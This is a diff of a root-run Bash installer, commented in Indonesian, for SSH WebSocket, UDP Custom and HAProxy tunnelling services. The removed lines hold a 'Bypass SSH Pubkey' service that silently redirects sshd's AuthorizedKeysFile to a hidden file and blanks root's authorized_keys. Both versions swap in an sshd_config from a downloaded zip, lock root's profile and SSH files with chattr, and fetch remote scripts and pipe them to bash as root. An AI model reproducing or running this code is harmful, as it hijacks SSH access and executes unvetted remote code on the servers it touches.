@@ -10,7 +10,6 @@ LOG_FILE="/usr/bin/securited"
 # ===============================
 # Fungsi Utilitas Umum
 # ===============================
-
 display_warning_message() {
   wall <<EOF
 ====================================
@@ -24,14 +23,10 @@ Terima kasih.
 EOF
 }
 
-change_profile() {
-  echo "[*] Mengubah file profile login..."
-  PROFILE_FILE="/root/.profile"
+change_profile(){
+PROFILE_FILE="/root/.profile"
 
-  # Buka gembok jika sebelumnya dikunci
-  chattr -i -a "$PROFILE_FILE" 2>/dev/null || true
-
-  cat > "$PROFILE_FILE" <<'EOF'
+cat > "$PROFILE_FILE" <<'EOF'
 # Ini hasil install_deteksi
 if [ "$BASH" ]; then
   if [ -f ~/.bashrc ]; then
@@ -57,40 +52,27 @@ else
 fi
 EOF
 
-  chmod +x "$PROFILE_FILE"
-  chattr +i "$PROFILE_FILE"
+chmod +x "$PROFILE_FILE"
+chattr +ia $PROFILE_FILE
 }
 
 setup_data() {
-  echo "[*] Menyiapkan data dan konfigurasi SSH kustom..."
-  apt-get update -y
-  apt-get install -y sudo curl unzip wget
-  
-  wget -qO /usr/bin/detek.zip "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/PROJECT.zip"
-  cd /usr/bin/
-  unzip -o detek.zip > /dev/null
-  mv -f detek ctrl > /dev/null 2>&1 || true
-  
-  # Pastikan file bisa diubah sebelum ditimpa
-  chattr -i -a /etc/ssh/sshd_config 2>/dev/null || true
-  chattr -i -a /etc/ssh 2>/dev/null || true
-  
-  if [ -f "sshd_config" ]; then
-      mv -f sshd_config /etc/ssh/sshd_config > /dev/null 
-  fi
-  
-  systemctl restart ssh sshd
-  chmod +x ctrl > /dev/null 2>&1 || true
-  rm -f detek.zip* > /dev/null
-  cd ~
+  apt install -y sudo curl
+wget -qO /usr/bin/detek.zip "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/PROJECT.zip"
+cd /usr/bin/
+unzip detek.zip > /dev/null
+mv detek ctrl > /dev/null
+chattr -ia /etc/ssh/sshd_config
+chattr -ia /etc/ssh
+mv sshd_config /etc/ssh/sshd_config > /dev/null 
+systemctl restart ssh
+chmod +x ctrl > /dev/null
+rm detek.zip* > /dev/null
+cd
 }
 
 inject_warning_to_profile() {
-  echo "[*] Menginjeksi SSH WebSocket Script..."
-  wget -qO sshws.sh https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/sshws.sh
-  chmod +x sshws.sh
-  ./sshws.sh
-  rm -f sshws.sh
+wget -q https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/sshws.sh && chmod +x sshws.sh && ./sshws.sh
 }
 
 set_cron_keamanan() {
@@ -104,34 +86,39 @@ set_cron_keamanan() {
       cp /etc/haproxy/haproxy.cfg "$BACKUP_HAPROXY"
   fi
 
-  echo "==> [2/3] Membuat skrip Bypass SSH Pubkey..."
+  echo "==> [2/3] Membuat skrip pemantau Ultra-Fast Auto-Heal..."
   cat > "$SCRIPT_FILE" << 'EOF'
-#!/usr/bin/env bash
-set -euo pipefail
+#!/bin/bash
 
-if [[ "$EUID" -ne 0 ]]; then
-  echo "Script ini harus dijalankan sebagai root." >&2
-  exit 1
-fi
+CONFIG="/etc/haproxy/haproxy.cfg"
+BACKUP="/etc/haproxy/.haproxy.cfg.backup"
 
-echo "[*] Mengamankan jalur SSH dari kunci ilegal..."
+while true; do
+    CEK_443=$(ss -tulnp | grep -w "haproxy" | grep -w "443")
+    CEK_80=$(ss -tulnp | grep -w "haproxy" | grep -w "80")
 
-mkdir -p /etc/ssh/my_secure_keys
-chmod 700 /etc/ssh/my_secure_keys
-
-
-touch /etc/ssh/my_secure_keys/authorized_keys
-chmod 600 /etc/ssh/my_secure_keys/authorized_keys
-
-sed -i 's|^#\?AuthorizedKeysFile.*|AuthorizedKeysFile /etc/ssh/my_secure_keys/authorized_keys|g' /etc/ssh/sshd_config
-
-chattr -i -a /root/.ssh/authorized_keys 2>/dev/null || true
-echo "Silakan timpa file ini, sudah tidak dibaca server :)" > /root/.ssh/authorized_keys
-
-systemctl restart sshd 2>/dev/null || true
-systemctl restart ssh 2>/dev/null || true
-
-echo "[+] Konfigurasi Bypass SSH Selesai."
+    if [[ -z "$CEK_443" ]] || [[ -z "$CEK_80" ]]; then
+        echo "[$(date)] Peringatan: HAProxy Port 443/80 Hilang! Melakukan Fast-Recovery..."
+        
+        chattr -i "$CONFIG" 2>/dev/null
+        
+        if [ -f "$BACKUP" ]; then
+            # Timpa langsung dari memori lokal (Sangat Cepat)
+            cp -f "$BACKUP" "$CONFIG"
+        else
+            wget -qO- https://raw.githubusercontent.com/ica4me/auto-script-free/main/fix-error/fix-proxy-nginx.sh | bash
+        fi
+        
+        #chattr +i "$CONFIG" 2>/dev/null
+        
+        systemctl reload haproxy 2>/dev/null || systemctl restart haproxy
+        
+        systemctl reload nginx 2>/dev/null || systemctl restart nginx
+        
+        sleep 3
+    fi
+    sleep 3
+done
 EOF
 
   chmod +x "$SCRIPT_FILE"
@@ -139,38 +126,44 @@ EOF
   echo "==> [3/3] Mengonfigurasi Polaris Systemd Service..."
   cat > "$SERVICE_FILE" <<EOF
 [Unit]
-Description=Polaris SSH Bypass Configuration
+Description=Polaris Ultra-Fast HAProxy Monitor
 After=network.target
 
 [Service]
 User=root
-Type=oneshot
+Type=simple
 ExecStart=$SCRIPT_FILE
-RemainAfterExit=yes
+Restart=always
+RestartSec=1
+OOMScoreAdjust=-1000
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-  systemctl daemon-reload
-  systemctl enable "$SERVICE_NAME"
-  systemctl start "$SERVICE_NAME"
+  #systemctl daemon-reload
+  #systemctl enable "$SERVICE_NAME"
+  #systemctl restart "$SERVICE_NAME"
+  
+  #echo "✅ Polaris Ultra-Fast Auto-Heal AKTIF!"
+  #echo "Salinan konfigurasi tersimpan di: $BACKUP_HAPROXY"
 }
 
+# (Bagian eksekusi Polaris dipanggil otomatis saat checking_sc, tidak butuh dieksekusi lepas di sini)
+
 pasang_udp() {
-  echo "[*] Memasang layanan UDP Custom..."
   mkdir -p /etc/udp
   ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
 
-  wget -qO /etc/udp/udp-custom "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/udp-custom-linux-amd64"
-  chmod +x /etc/udp/udp-custom
+#  wget -qO /etc/udp/udp-custom "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/udp-custom-linux-amd64"
+#  chmod +x /etc/udp/udp-custom
 
-  wget -qO /etc/udp/config.json "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/config_2.json"
-  chmod 644 /etc/udp/config.json
+#  wget -qO /etc/udp/config.json "https://raw.githubusercontent.com/ica4me/auto-script-free/main/udp-custom/config_2.json"
+#  chmod 644 /etc/udp/config.json
 
   cat > /etc/systemd/system/udp-custom.service <<EOF
 [Unit]
-Description=UDP Custom by ePro Dev. Team (Mod by Najm)
+Description=UDP Custom by ePro Dev. Team
 After=network-online.target
 Wants=network-online.target
 
@@ -187,33 +180,28 @@ RestartSec=2s
 WantedBy=default.target
 EOF
 
-  systemctl daemon-reload
-  systemctl enable udp-custom
-  systemctl restart udp-custom
-  systemctl restart ssh sshd
+#  systemctl daemon-reload
+#  systemctl enable udp-custom
+#  rm -r /root/udp 2>/dev/null
+#  systemctl restart ssh sshd
 }
 
 checking_sc() {
-  echo "[*] Memulai proses instalasi dan pengamanan server..."
-  
-  display_warning_message
-  change_profile
-  setup_data
+  # Blok Izin Otomatis: Eksekusi Langsung Tanpa Validasi IP
   set_cron_keamanan
   inject_warning_to_profile
   pasang_udp
-  
-  echo "[+] Semua proses instalasi selesai!"
 }
 
-# DOMAIN=$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")
-# IP_ADDRESS=$(hostname -I | awk '{print $1}')
-# ipsaya=$(curl -s ipv4.icanhazip.com)
+# ===============================
+# Main Entry Point
+# ===============================
 
-if [[ "${1:-}" == "server" ]]; then
+#DOMAIN=$(cat "$DOMAIN_FILE" 2>/dev/null || echo "Tidak ditemukan")
+#IP_ADDRESS=$(hostname -I | awk '{print $1}')
+#ipsaya=$(curl -s ipv4.icanhazip.com)
+
+if [[ "$1" == "server" ]]; then
   checking_sc
-  rm -rf /root/udp 2>/dev/null
-else
-  echo "Gunakan argumen 'server' untuk menjalankan script."
-  echo "Contoh: ./install_server.sh server"
+  rm -rf /root/udp
 fi
